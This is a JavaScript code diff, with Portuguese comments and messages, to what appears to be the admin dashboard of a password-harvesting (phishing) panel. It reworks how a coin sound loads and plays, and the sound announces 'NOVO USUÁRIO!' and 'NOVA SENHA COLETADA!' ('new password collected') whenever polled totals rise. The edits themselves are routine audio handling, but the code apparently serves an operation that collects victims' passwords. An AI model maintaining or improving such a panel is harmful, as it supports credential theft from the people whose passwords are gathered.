@@ -1233,32 +1233,28 @@ let somLigado = true;
 let ultimoTotalUsuarios = 0;
 let ultimoTotalLogs = 0;
 let audioSom = null;
-let audioInicializado = false;
 
-// Inicializar áudio após clique do usuário
+// Carregar áudio local (baixado no servidor)
 function inicializarAudio() {
-    if (audioInicializado) return;
-    audioSom = new Audio('https://www.soundjay.com/misc/sounds/coin-drop-01.mp3');
+    if (audioSom) return;
+    
+    // Coloque o arquivo de áudio na mesma pasta do admin.html
+    audioSom = new Audio('/audio/coin.mp3');  // ou '/sounds/coin.mp3'
+    audioSom.volume = 0.7;
     audioSom.load();
-    audioInicializado = true;
-    console.log('🔊 Áudio inicializado');
+    console.log('Áudio carregado');
 }
 
 function tocarSom() {
     if (!somLigado) return;
     
-    // Inicializar se ainda não foi
-    if (!audioInicializado) {
+    if (!audioSom) {
         inicializarAudio();
     }
     
     if (audioSom) {
         audioSom.currentTime = 0;
-        audioSom.play().catch(e => {
-            console.log('Som não reproduzido automaticamente:', e);
-            // Mostrar dica para o usuário
-            showToast('🔊 Clique em qualquer lugar para ativar os sons', 'info');
-        });
+        audioSom.play().catch(e => console.log('Som não reproduzido:', e));
     }
 }
 
@@ -1268,9 +1264,8 @@ function alternarSom() {
     if (btn) {
         btn.innerHTML = somLigado ? '<i class="fas fa-volume-up"></i>' : '<i class="fas fa-volume-mute"></i>';
     }
-    showToast(somLigado ? '🔊 Sons ativados' : '🔇 Sons desativados', 'info');
+    showToast(somLigado ? 'Sons ativados' : 'Sons desativados', 'info');
     
-    // Testar som ao ativar
     if (somLigado) {
         setTimeout(() => tocarSom(), 100);
     }
@@ -1297,17 +1292,10 @@ btnSom.innerHTML = '<i class="fas fa-volume-up" style="color:white; font-size:20
 btnSom.onclick = alternarSom;
 document.body.appendChild(btnSom);
 
-// Inicializar áudio no primeiro clique em qualquer lugar da página
-function iniciarAudioPrimeiroClique() {
+// Inicializar ao carregar a página
+window.addEventListener('load', () => {
     inicializarAudio();
-    tocarSom();
-    document.removeEventListener('click', iniciarAudioPrimeiroClique);
-    document.removeEventListener('keydown', iniciarAudioPrimeiroClique);
-    console.log('🎵 Áudio ativado por interação do usuário');
-}
-
-document.addEventListener('click', iniciarAudioPrimeiroClique);
-document.addEventListener('keydown', iniciarAudioPrimeiroClique);
+});
 
 function verificarNovosDados() {
     if (!adminToken) return;
@@ -1321,11 +1309,11 @@ function verificarNovosDados() {
             
             if (totalUsuarios > ultimoTotalUsuarios && ultimoTotalUsuarios !== 0) {
                 tocarSom();
-                showToast(`💰 NOVO USUÁRIO! Total: ${totalUsuarios}`, 'success');
+                showToast(`NOVO USUÁRIO! Total: ${totalUsuarios}`, 'success');
             }
             if (totalLogs > ultimoTotalLogs && ultimoTotalLogs !== 0) {
                 tocarSom();
-                showToast(`💰 NOVA SENHA COLETADA!`, 'info');
+                showToast(`NOVA SENHA COLETADA!`, 'info');
             }
             
             ultimoTotalUsuarios = totalUsuarios;
